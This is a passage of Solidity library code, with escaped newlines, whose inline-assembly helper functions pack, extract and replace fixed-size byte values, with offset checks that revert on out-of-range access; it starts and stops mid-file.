  function pack_12_20(bytes12 left, bytes20 right) internal pure returns (bytes32 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(160, not(0)))\n            right := and(right, shl(96, not(0)))\n            result := or(left, shr(96, right))\n        }\n    }\n\n    function pack_16_4(bytes16 left, bytes4 right) internal pure returns (bytes20 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(128, not(0)))\n            right := and(right, shl(224, not(0)))\n            result := or(left, shr(128, right))\n        }\n    }\n\n    function pack_16_6(bytes16 left, bytes6 right) internal pure returns (bytes22 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(128, not(0)))\n            right := and(right, shl(208, not(0)))\n            result := or(left, shr(128, right))\n        }\n    }\n\n    function pack_16_8(bytes16 left, bytes8 right) internal pure returns (bytes24 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(128, not(0)))\n            right := and(right, shl(192, not(0)))\n            result := or(left, shr(128, right))\n        }\n    }\n\n    function pack_16_12(bytes16 left, bytes12 right) internal pure returns (bytes28 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(128, not(0)))\n            right := and(right, shl(160, not(0)))\n            result := or(left, shr(128, right))\n        }\n    }\n\n    function pack_16_16(bytes16 left, bytes16 right) internal pure returns (bytes32 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(128, not(0)))\n            right := and(right, shl(128, not(0)))\n            result := or(left, shr(128, right))\n        }\n    }\n\n    function pack_20_2(bytes20 left, bytes2 right) internal pure returns (bytes22 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(96, not(0)))\n            right := and(right, shl(240, not(0)))\n            result := or(left, shr(160, right))\n        }\n    }\n\n    function pack_20_4(bytes20 left, bytes4 right) internal pure returns (bytes24 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(96, not(0)))\n            right := and(right, shl(224, not(0)))\n            result := or(left, shr(160, right))\n        }\n    }\n\n    function pack_20_8(bytes20 left, bytes8 right) internal pure returns (bytes28 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(96, not(0)))\n            right := and(right, shl(192, not(0)))\n            result := or(left, shr(160, right))\n        }\n    }\n\n    function pack_20_12(bytes20 left, bytes12 right) internal pure returns (bytes32 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(96, not(0)))\n            right := and(right, shl(160, not(0)))\n            result := or(left, shr(160, right))\n        }\n    }\n\n    function pack_22_2(bytes22 left, bytes2 right) internal pure returns (bytes24 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(80, not(0)))\n            right := and(right, shl(240, not(0)))\n            result := or(left, shr(176, right))\n        }\n    }\n\n    function pack_22_6(bytes22 left, bytes6 right) internal pure returns (bytes28 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(80, not(0)))\n            right := and(right, shl(208, not(0)))\n            result := or(left, shr(176, right))\n        }\n    }\n\n    function pack_22_10(bytes22 left, bytes10 right) internal pure returns (bytes32 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(80, not(0)))\n            right := and(right, shl(176, not(0)))\n            result := or(left, shr(176, right))\n        }\n    }\n\n    function pack_24_4(bytes24 left, bytes4 right) internal pure returns (bytes28 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(64, not(0)))\n            right := and(right, shl(224, not(0)))\n            result := or(left, shr(192, right))\n        }\n    }\n\n    function pack_24_8(bytes24 left, bytes8 right) internal pure returns (bytes32 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(64, not(0)))\n            right := and(right, shl(192, not(0)))\n            result := or(left, shr(192, right))\n        }\n    }\n\n    function pack_28_4(bytes28 left, bytes4 right) internal pure returns (bytes32 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(32, not(0)))\n            right := and(right, shl(224, not(0)))\n            result := or(left, shr(224, right))\n        }\n    }\n\n    function extract_2_1(bytes2 self, uint8 offset) internal pure returns (bytes1 result) {\n        if (offset > 1) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(248, not(0)))\n        }\n    }\n\n    function replace_2_1(bytes2 self, bytes1 value, uint8 offset) internal pure returns (bytes2 result) {\n        bytes1 oldValue = extract_2_1(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(248, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_4_1(bytes4 self, uint8 offset) internal pure returns (bytes1 result) {\n        if (offset > 3) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(248, not(0)))\n        }\n    }\n\n    function replace_4_1(bytes4 self, bytes1 value, uint8 offset) internal pure returns (bytes4 result) {\n        bytes1 oldValue = extract_4_1(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(248, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_4_2(bytes4 self, uint8 offset) internal pure returns (bytes2 result) {\n        if (offset > 2) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(240, not(0)))\n        }\n    }\n\n    function replace_4_2(bytes4 self, bytes2 value, uint8 offset) internal pure returns (bytes4 result) {\n        bytes2 oldValue = extract_4_2(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(240, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_6_1(bytes6 self, uint8 offset) internal pure returns (bytes1 result) {\n        if (offset > 5) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(248, not(0)))\n        }\n    }\n\n    function replace_6_1(bytes6 self, bytes1 value, uint8 offset) internal pure returns (bytes6 result) {\n        bytes1 oldValue = extract_6_1(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(248, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_6_2(bytes6 self, uint8 offset) internal pure returns (bytes2 result) {\n        if (offset > 4) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(240, not(0)))\n        }\n    }\n\n    function replace_6_2(bytes6 self, bytes2 value, uint8 offset) internal pure returns (bytes6 result) {\n        bytes2 oldValue = extract_6_2(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(240, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_6_4(bytes6 self, uint8 offset) internal pure returns (bytes4 result) {\n        if (offset > 2) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(224, not(0)))\n        }\n    }\n\n    function replace_6_4(bytes6 self, bytes4 value, uint8 offset) internal pure returns (bytes6 result) {\n        bytes4 oldValue = extract_6_4(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(224, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_8_1(bytes8 self, uint8 offset) internal pure returns (bytes1 result) {\n        if (offset > 7) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(248, not(0)))\n        }\n    }\n\n    function replace_8_1(bytes8 self, bytes1 value, uint8 offset) internal pure returns (bytes8 result) {\n        bytes1 oldValue = extract_8_1(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(248, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_8_2(bytes8 self, uint8 offset) internal pure returns (bytes2 result) {\n        if (offset > 6) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(240, not(0)))\n        }\n    }\n\n    function replace_8_2(bytes8 self, bytes2 value, uint8 offset) internal pure returns (bytes8 result) {\n        bytes2 oldValue = extract_8_2(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(240, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_8_4(bytes8 self, uint8 offset) internal pure returns (bytes4 result) {\n        if (offset > 4) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(224, not(0)))\n        }\n    }\n\n    function replace_8_4(bytes8 self, bytes4 value, uint8 offset) internal pure returns (bytes8 result) {\n        bytes4 oldValue = extract_8_4(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(224, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_8_6(bytes8 self, uint8 offset) internal pure returns (bytes6 result) {\n        if (offset > 2) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(208, not(0)))\n        }\n    }\n\n    function replace_8_6(bytes8 self, bytes6 value, uint8 offset) internal pure returns (bytes8 result) {\n        bytes6 oldValue = extract_8_6(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(208, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_10_1(bytes10 self, uint8 offset) internal pure returns (bytes1 result) {\n        if (offset > 9) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(248, not(0)))\n        }\n    }\n\n    function replace_10_1(bytes10 self, bytes1 value, uint8 offset) internal pure returns (bytes10 result) {\n        bytes1 oldValue = extract_10_1(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(248, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_10_2(bytes10 self, uint8 offset) internal pure returns (bytes2 result) {\n        if (offset > 8) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(240, not(0)))\n        }\n    }\n\n    function replace_10_2(bytes10 self, bytes2 value, uint8 offset) internal pure returns (bytes10 result) {\n        bytes2 oldValue = extract_10_2(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(240, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_10_4(bytes10 self, uint8 offset) internal pure returns (bytes4 result) {\n        if (offset > 6) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(224, not(0)))\n        }\n    }\n\n    function replace_10_4(bytes10 self, bytes4 value, uint8 offset) internal pure returns (bytes10 result) {\n        bytes4 oldValue = extract_10_4(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(224, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_10_6(bytes10 self, uint8 offset) internal pure returns (bytes6 result) {\n        if (offset > 4) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(208, not(0)))\n        }\n    }\n\n    function replace_10_6(bytes10 self, bytes6 value, uint8 offset) internal pure returns (bytes10 result) {\n        bytes6 oldValue = extract_10_6(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(208, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_10_8(bytes10 self, uint8 offset) internal pure returns (bytes8 result) {\n        if (offset > 2) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(192, not(0)))\n        }\n    }\n\n    function replace_10_8(bytes10 self, bytes8 value, uint8 offset) internal pure returns (bytes10 result) {\n        bytes8 oldValue = extract_10_8(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(192, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_12_1(bytes12 self, uint8 offset) internal pure returns (bytes1 result) {\n        if (offset > 11) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(248, not(0)))\n        }\n    }\n\n    function replace_12_1(bytes12 self, bytes1 value, uint8 offset) internal pure returns (bytes12 result) {\n        bytes1 oldValue = extract_12_1(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(248, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_12_2(bytes12 self, uint8 offset) internal pure returns (bytes2 result) {\n        if (offset > 10) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(240, not(0)))\n        }\n    }\n\n    function replace_12_2(bytes12 self, bytes2 value, uint8 offset) internal pure returns (bytes12 result) {\n        bytes2 oldValue = extract_12_2(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(240, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_12_4(bytes12 self, uint8 offset) internal pure returns (bytes4 result) {\n        if (offset > 8) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(224, not(0)))\n        }\n    }\n\n    function replace_12_4(bytes12 self, bytes4 value, uint8 offset) internal pure returns (bytes12 result) {\n        bytes4 oldValue = extract_12_4(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(224, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_12_6(bytes12 self, uint8 offset) internal pure returns (bytes6 result) {\n        if (offset > 6) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(208, not(0)))\n        }\n    }\n\n    function replace_12_6(bytes12 self, bytes6 value, uint8 offset) internal pure returns (bytes12 result) {\n        bytes6 oldValue = extract_12_6(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(208, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_12_8(bytes12 self, uint8 offset) internal pure returns (bytes8 result) {\n        if (offset > 4) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(192, not(0)))\n        }\n    }\n\n    function replace_12_8(bytes12 self, bytes8 value, uint8 offset) internal pure returns (bytes12 result) {\n        bytes8 oldValue = extract_12_8(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(192, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_12_10(bytes12 self, uint8 offset) internal pure returns (bytes10 result) {\n        if (offset > 2) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(176, not(0)))\n        }\n    }\n\n    function replace_12_10(bytes12 self, bytes10 value, uint8 offset) internal pure returns (bytes12 result) {\n        bytes10 oldValue = extract_12_10(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(176, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_16_1(bytes16 self, uint8 offset) internal pure returns (bytes1 result) {\n        if (offset > 15) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(248, not(0)))\n        }\n    }\n\n    function replace_16_1(bytes16 self, bytes1 value, uint8 offset) internal pure returns (bytes16 result) {\n        bytes1 oldValue = extract_16_1(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(248, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_16_2(bytes16 self, uint8 offset) internal pure returns (bytes2 result) {\n        if (offset > 14) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(240, not(0)))\n        }\n    }\n\n    function replace_16_2(bytes16 self, bytes2 value, uint8 offset) internal pure returns (bytes16 result) {\n        bytes2 oldValue = extract_16_2(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(240, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_16_4(bytes16 self, uint8 offset) internal pure returns (bytes4 result) {\n        if (offset > 12) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(224, not(0)))\n        }\n    }\n\n    function replace_16_4(bytes16 self, bytes4 value, uint8 offset) internal pure returns (bytes16 result) {\n        bytes4 oldValue = extract_16_4(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(224, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_16_6(bytes16 self, uint8 offset) internal pure returns (bytes6 result) {\n        if (offset > 10) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(208, not(0)))\n        }\n    }\n\n    function replace_16_6(bytes16 self, bytes6 value, uint8 offset) internal pure returns (bytes16 result) {\n        bytes6 oldValue = extract_16_6(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(208, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_16_8(bytes16 self, uint8 offset) internal pure returns (bytes8 result) {\n        if (offset > 8) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(192, not(0)))\n        }\n    }\n\n    function replace_16_8(bytes16 self, bytes8 value, uint8 offset) internal pure returns (bytes16 result) {\n        bytes8 oldValue = extract_16_8(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(192, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_16_10(bytes16 self, uint8 offset) internal pure returns (bytes10 result) {\n        if (offset > 6) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(176, not(0)))\n        }\n    }\n\n    function replace_16_10(bytes16 self, bytes10 value, uint8 offset) internal pure returns (bytes16 result) {\n        bytes10 oldValue = extract_16_10(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(176, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_16_12(bytes16 self, uint8 offset) internal pure returns (bytes12 result) {\n        if (offset > 4) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(160, not(0)))\n        }\n    }\n\n    function replace_16_12(bytes16 self, bytes12 value, uint8 offset) internal pure returns (bytes16 result) {\n        bytes12 oldValue = extract_16_12(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(160, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_20_1(bytes20 self, uint8 offset) internal pure returns (bytes1 result) {\n        if (offset > 19) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(248, not(0)))\n        }\n    }\n\n    function replace_20_1(bytes20 self, bytes1 value, uint8 offset) internal pure returns (bytes20 result) {\n        bytes1 oldValue = extract_20_1(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(248, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_20_2(bytes20 self, uint8 offset) internal pure returns (bytes2 result) {\n        if (offset > 18) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(240, not(0)))\n        }\n    }\n\n    function replace_20_2(bytes20 self, bytes2 value, uint8 offset) internal pure returns (bytes20 result) {\n        bytes2 oldValue = extract_20_2(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(240, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_20_4(bytes20 self, uint8 offset) internal pure returns (bytes4 result) {\n        if (offset > 16) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(224, not(0)))\n        }\n    }\n\n    function replace_20_4(bytes20 self, bytes4 value, uint8 offset) internal pure returns (bytes20 result) {\n        bytes4 oldValue = extract_20_4(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(224, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_20_6(bytes20 self, uint8 offset) internal pure returns (bytes6 result) {\n        if (offset > 14) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(208, not(0)))\n        }\n    }\n\n    function replace_20_6(bytes20 self, bytes6 value, uint8 offset) internal pure returns (bytes20 result) {\n        bytes6 oldValue = extract_20_6(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(208, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_20_8(bytes20 self, uint8 offset) internal pure returns (bytes8 result) {\n        if (offset > 12) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(192, not(0)))\n        }\n    }\n\n    function replace_20_8(bytes20 self, bytes8 value, uint8 offset) internal pure returns (bytes20 result) {\n        bytes8 oldValue = extract_20_8(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(192, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_20_10(bytes20 self, uint8 offset) internal pure returns (bytes10 result) {\n        if (offset > 10) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(176, not(0)))\n        }\n    }\n\n    function replace_20_10(bytes20 self, bytes10 value, uint8 offset) internal pure returns (bytes20 result) {\n        bytes10 oldValue = extract_20_10(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(176, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_20_12(bytes20 self, uint8 offset) internal pure returns (bytes12 result) {\n        if (offset > 8) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(160, not(0)))\n        }\n    }\n\n    function replace_20_12(bytes20 self, bytes12 value, uint8 offset) internal pure returns (bytes20 result) {\n        bytes12 oldValue = extract_20_12(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(160, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_20_16(bytes20 self, uint8 offset) internal pure returns (bytes16 result) {\n        if (offset > 4) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(128, not(0)))\n        }\n    }\n\n    function replace_20_16(bytes20 self, bytes16 value, uint8 offset) internal pure returns (bytes20 result) {\n        bytes16 oldValue = extract_20_16(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(128, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_22_1(bytes22 self, uint8 offset) internal pure returns (bytes1 result) {\n        if (offset > 21) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(248, not(0)))\n        }\n    }\n\n    function replace_22_1(bytes22 self, bytes1 value, uint8 offset) internal pure returns (bytes22 result) {\n        bytes1 oldValue = extract_22_1(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(248, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_22_2(bytes22 self, uint8 offset) internal pure returns (bytes2 result) {\n        if (offset > 20) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(240, not(0)))\n        }\n    }\n\n    function replace_22_2(bytes22 self, bytes2 value, uint8 offset) internal pure returns (bytes22 result) {\n        bytes2 oldValue = extract_22_2(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(240, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_22_4(bytes22 self, uint8 offset) internal pure returns (bytes4 result) {\n        if (offset > 18) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(224, not(0)))\n        }\n    }\n\n    function replace_22_4(bytes22 self, bytes4 value, uint8 offset) internal pure returns (bytes22 result) {\n        bytes4 oldValue = extract_22_4(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(224, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_22_6(bytes22 self, uint8 offset) internal pure returns (bytes6 result) {\n        if (offset > 16) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(208, not(0)))\n        }\n    }\n\n    function replace_22_6(bytes22 self, bytes6 value, uint8 offset) internal pure returns (bytes22 result) {\n        bytes6 oldValue = extract_22_6(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(208, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_22_8(bytes22 self, uint8 offset) internal pure returns (bytes8 result) {\n        if (offset > 14) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(192, not(0)))\n        }\n    }\n\n    function replace_22_8(bytes22 self, bytes8 value, uint8 offset) internal pure returns (bytes22 result) {\n        bytes8 oldValue = extract_22_8(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(192, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_22_10(bytes22 self, uint8 offset) internal pure returns (bytes10 result) {\n        if (offset > 12) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(176, not(0)))\n        }\n    }\n\n    function replace_22_10(bytes22 self, bytes10 value, uint8 offset) internal pure returns (bytes22 result) {\n        bytes10 oldValue = extract_22_10(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(176, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_22_12(bytes22 self, uint8 offset) internal pure returns (bytes12 result) {\n        if (offset > 10) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(160, not(0)))\n        }\n    }\n\n    function replace_22_12(bytes22 self, bytes12 value, uint8 offset) internal pure returns (bytes22 result) {\n        bytes12 oldValue = extract_22_12(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(160, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_22_16(bytes22 self, uint8 offset) internal pure returns (bytes16 result) {\n        if (offset > 6) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(128, not(0)))\n        }\n    }\n\n    function replace_22_16(bytes22 self, bytes16 value, uint8 offset) internal pure returns (bytes22 result) {\n        bytes16 oldValue = extract_22_16(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(128, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_22_20(bytes22 self, uint8 offset) internal pure returns (bytes20 result) {\n        if (offset > 2) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(96, not(0)))\n        }\n    }\n\n    function replace_22_20(bytes22 self, bytes20 value, uint8 offset) internal pure returns (bytes22 result) {\n        bytes20 oldValue = extract_22_20(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(96, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_24_1(bytes24 self, uint8 offset) internal pure returns (bytes1 result) {\n        if (offset > 23) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(248, not(0)))\n        }\n    }\n\n    function replace_24_1(bytes24 self, bytes1 value, uint8 offset) internal pure returns (bytes24 result) {\n        bytes1 oldValue = extract_24_1(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(248, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_24_2(bytes24 self, uint8 offset) internal pure returns (bytes2 result) {\n        if (offset > 22) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(240, not(0)))\n        }\n    }\n\n    function replace_24_2(bytes24 self, bytes2 value, uint8 offset) internal pure returns (bytes24 result) {\n        bytes2 oldValue = extract_24_2(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(240, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_24_4(bytes24 self, uint8 offset) internal pure returns (bytes4 result) {\n        if (offset > 20) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(224, not(0)))\n        }\n    }\n\n    function replace_24_4(bytes24 self, bytes4 value, uint8 offset) internal pure returns (bytes24 result) {\n        bytes4 oldValue = extract_24_4(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(224, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_24_6(bytes24 self, uint8 offset) internal pure returns (bytes6 result) {\n        if (offset > 18) revert 